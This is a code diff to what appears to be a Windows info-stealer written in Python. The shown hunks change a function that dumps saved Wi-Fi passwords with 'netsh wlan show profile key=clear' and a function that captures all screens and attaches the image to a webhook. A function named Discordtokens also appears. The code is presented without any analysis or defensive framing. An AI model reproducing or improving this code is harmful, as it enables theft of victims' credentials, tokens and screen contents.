@@ -81,7 +81,7 @@ def ip6():#get ipv6
         return []
 def wifipass():
     try:
-     data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
+     data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp949').split('\n')
     except subprocess.CalledProcessError: 
         return []
     profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
@@ -91,7 +91,7 @@ def wifipass():
         return []
 
     for i in profiles:
-        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
+        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('cp949').split('\n')
         results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
         try:
             wifi_info[i] = results[0]
@@ -543,7 +543,12 @@ def Discordtokens():
     return tokens                                    
 
 def screenie():
-    sss = ImageGrab.grab()
+    sss = ImageGrab.grab(
+            bbox=None,
+            all_screens=True,
+            include_layered_windows=False,
+            xdisplay=None
+    )
     sss.save(userhome+"\\AppData\\Local\\Temp\\ss.png")
     with open(userhome+"\\AppData\\Local\\Temp\\ss.png", "rb")as file:
      webhook.add_file(file.read(),'SCREENIE.png')
